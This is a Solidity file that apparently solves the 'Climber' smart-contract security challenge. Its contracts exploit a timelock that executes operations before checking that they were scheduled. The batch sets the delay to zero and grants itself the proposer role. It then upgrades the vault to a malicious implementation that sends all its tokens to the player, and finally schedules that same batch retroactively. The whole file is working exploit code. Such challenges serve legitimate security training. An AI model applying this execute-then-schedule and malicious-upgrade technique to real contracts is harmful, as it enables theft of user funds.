// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../climber/ClimberTimelock.sol";
import "../climber/ClimberVault.sol";

contract Solver {
    address[] targets;
    uint[] values = [0, 0, 0, 0];
    bytes[] data;
    bytes32 constant SALT = bytes32(0);
    ClimberTimelock immutable timelock;

    constructor(
        ClimberVault _vault,
        ClimberTimelock _timelock,
        IERC20 dvt,
        address player
    ) {
        targets.push(address(_timelock));
        targets.push(address(_timelock));
        targets.push(address(_vault));
        targets.push(address(this));

        data.push(abi.encodeCall(ClimberTimelock.updateDelay, (0)));
        data.push(
            abi.encodeCall(
                AccessControl.grantRole,
                (PROPOSER_ROLE, address(this))
            )
        );
        data.push(
            abi.encodeCall(
                _vault.upgradeToAndCall,
                (
                    address(new VaultV2()),
                    abi.encodeCall(VaultV2.transfer, (dvt, player))
                )
            )
        );
        data.push(abi.encodeCall(this.callSchedule, ()));

        timelock = _timelock;
    }

    function callSchedule() external {
        timelock.schedule(targets, values, data, SALT);
    }

    function callExecute() external {
        timelock.execute(targets, values, data, SALT);
    }
}

contract VaultV2 is ClimberVault {
    function transfer(IERC20 dvt, address player) external {
        dvt.transfer(player, 10000000 ether);
    }
}


contract SolveClimber {
    constructor(ClimberVault vault, ClimberTimelock timelock, IERC20 dvt) {
        Solver solver = new Solver(vault, timelock, dvt, msg.sender);
        solver.callExecute();
    }
}
